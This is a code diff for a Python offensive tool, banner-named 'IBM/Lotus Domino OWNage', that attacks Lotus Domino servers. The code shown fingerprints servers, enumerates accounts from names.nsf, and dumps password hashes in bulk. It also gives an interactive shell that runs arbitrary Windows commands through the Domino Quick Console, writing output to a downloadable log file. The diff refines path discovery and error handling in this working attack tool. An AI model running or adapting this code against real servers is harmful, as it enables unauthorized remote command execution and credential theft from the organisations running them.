@@ -37,27 +37,19 @@ class Interactive(cmd.Cmd):
 		self.username = username
 		self.password = password
 		self.local_path = local_path
+		self.HEADER = HEADER
 
 	def emptyline(self):
 		pass
 
 	def default(self, line):
 		operator = '> '
-		self.quick_console(line, operator, self.target, self.username, self.password, self.local_path)
+		self.quick_console(line, operator, self.target, self.username, self.password, self.local_path, self.HEADER)
 
 	# Handle Domino Quick Console
-	def quick_console(self, command, operator, url, username, password, path):
+	def quick_console(self, command, operator, url, username, password, path, header):
 		session = requests.Session()
 		session.auth = (username, password)
-
-		header = {
-			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
-			'Accept': '*/*',
-			'Accept-Language': 'en-US,en;q=0.5',
-			'Accept-Encoding': 'gzip, deflate',
-			'Referer': "{0}/webadmin.nsf/pgBookmarks?OpenPage".format(url),
-			'Connection': 'keep-alive'
-		}
 
 		# Encode command
 		raw_command = 'load cmd /c {0} {1}"{2}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(command, operator, path)
@@ -77,7 +69,7 @@ class Interactive(cmd.Cmd):
 			elif get_response.status_code == 404 and '>' not in operator:
 				print 'Outfile sucessfully deleted'
 			else:
-				print 'Output file was not found!'
+				print 'Outfile not found!'
 				do_exit
 		else:
 			print 'Quick Console is unavaliable!'
@@ -86,7 +78,7 @@ class Interactive(cmd.Cmd):
 	def do_EOF(self, line):
 		operator = ''
 		command = 'del'
-		self.quick_console(command, operator, self.target, self.username, self.password, self.local_path)
+		self.quick_console(command, operator, self.target, self.username, self.password, self.local_path, self.HEADER)
 		return True
 
 	def help_EOF(self):
@@ -113,7 +105,9 @@ def fingerprint(url, header):
 					return domino_version.group(1)
 			else:
 				continue
-		except:
+
+		except Exception as error:
+			print_error("Error: {0}".format(error))
 			continue
 
 	return None
@@ -131,31 +125,60 @@ def check_portals(url, header):
 				print_warn("{0}/{1} requires authentication".format(url, portal))
 			else:
 				print_error("Could not find {0}!".format(portal))
-		except:
+
+		except Exception as error:
+			print_error("Error: {0}".format(error))
 			continue
 
-# Determine Domino file structure
-def check_access(url, username, password, version):
+# Check access to webadmin.nsf and get local file path
+def check_access(url, header, username, password):
 	session = requests.Session()
 	session.auth = (username, password)
 
-	header = {
-		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
-		'Accept': '*/*',
-		'Accept-Language': 'en-US,en;q=0.5',
-		'Accept-Encoding': 'gzip, deflate',
-		'Referer': "{0}/webadmin.nsf/pgBookmarks?OpenPage".format(url),
-		'Connection': 'keep-alive'
-	}
+	try:
+		webadmin_url = "{0}/webadmin.nsf".format(url)
+		check_webadmin = session.get(webadmin_url, headers=header, verify=False)
+		if check_webadmin.status_code == 200:
+			path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(url)
+			check_path = session.get(path_url, headers=header, verify=False)
+			path_regex = re.search('>(?i)([a-z]:\\\\[a-z0-9()].+\\\\[a-z].+)\\\\domino\\\\data', check_path.text)
+			if path_regex:
+				path = path_regex.group(1)
+			else:
+				path = None
+				print_status('Could not identify Domino file path, trying defaults...')
+		elif check_webadmin.status_code == 401:
+			print_error('Unable to access webadmin.nsf, try with an admin account!')
+			sys.exit(0)
+		else:
+			print_error('Unable to find webadmin.nsf!')
+			sys.exit(0)
 
-	local_paths = ['C:\\Program Files\\IBM\\',      # 9.0.1 Windows x64
+	except Exception as error:
+		print_error("Error: {0}".format(error))
+		sys.exit(0)
+
+	who_am_i, local_path = test_command(url, header, path, username, password)
+	return who_am_i, local_path
+
+# Ensure Domino Quick Console is working
+def test_command(url, header, path, username, password):
+	session = requests.Session()
+	session.auth = (username, password)
+
+	# Default Domino install paths
+	paths = ['C:\\Program Files\\IBM\\',            # 9.0.1 Windows x64
 		'C:\\Program Files\\IBM\\Lotus\\',          # 8.5.3 Windows x64
 		'C:\\Program Files (x86)\\IBM\\',           # 9.0.1 Windows x86
 		'C:\\Program Files (x86)\\IBM\\Lotus\\',    # 8.5.3 Windows x86
 		'C:\\Lotus\\'                               # Not sure, but just in case
 	]
 
-	for local_path in local_paths:
+	if path:
+		found_path = "{0}\\".format(path)
+		paths.insert(0, found_path)
+
+	for local_path in paths:
 		try:
 			# Encode command
 			raw_command = 'load cmd /c whoami > "{0}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(local_path)
@@ -172,8 +195,9 @@ def check_access(url, username, password, version):
 					get_user = re.search(".+\\\\(.+)", get_response.text)
 					if get_user:
 						return get_user.group(1), local_path
-		except:
-			break
+
+		except Exception as error:
+			print_error("Error: {0}".format(error))
 
 	return None, None
 
@@ -200,11 +224,14 @@ def enum_accounts(url, header, username, password):
 							accounts.append(match.group(1))
 						else:
 							pass
-			else:
-				print_error('Not authorized, bad username or password!')
+			elif request.status_code == 401:
+				print_error('Unable to access names.nsf, bad username or password!')
 				sys.exit(0)
-		except:
-			print_error('Could not connect to Domino server!')
+			else:
+				print_error('Could not connect to Domino server!')
+
+		except Exception as error:
+			print_error("Error: {0}".format(error))
 			break
 
 	print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
@@ -230,7 +257,7 @@ def async_requests(accounts, url, header, username, password):
 			async_list.append(action_item)
 			i += 1
 
-		except KeyboardInterrupt:
+		except KeyboardInterrupt as key:
 			break
 
 	grequests.map(async_list, size=NUM_SESSIONS * 5)
@@ -303,8 +330,8 @@ if __name__ == '__main__':
              IBM/Lotus Domino OWNage
 """))
 	parser.add_argument('--url', help='Domino server URL', required=False)
-	parser.add_argument('-u', '--username', help='Username, default: [None]', default='', required=False)
-	parser.add_argument('-p', '--password', help='Password, default: [None]', default='', nargs='+', required=False)
+	parser.add_argument('-u', '--username', help='Username', default='', required=False)
+	parser.add_argument('-p', '--password', help='Password', default='', nargs='+', required=False)
 	parser.add_argument('--hashdump', help='Dump Domino hashes', action='store_true', required=False)
 	parser.add_argument('--quickconsole', help='Interact with Domino Quick Console', action='store_true', required=False)
 	args = parser.parse_args()
@@ -336,8 +363,7 @@ if __name__ == '__main__':
 	# Interact with quick console
 	if args.quickconsole:
 		print_status('Accessing Domino Quick Console...')
-		version = fingerprint(target, HEADER)
-		who_am_i, local_path = check_access(target, username, password, version)
+		who_am_i, local_path = check_access(target, HEADER, username, password)
 		if who_am_i:
 			print_good("Running as {0}".format(who_am_i))
 			Interactive().cmdloop()
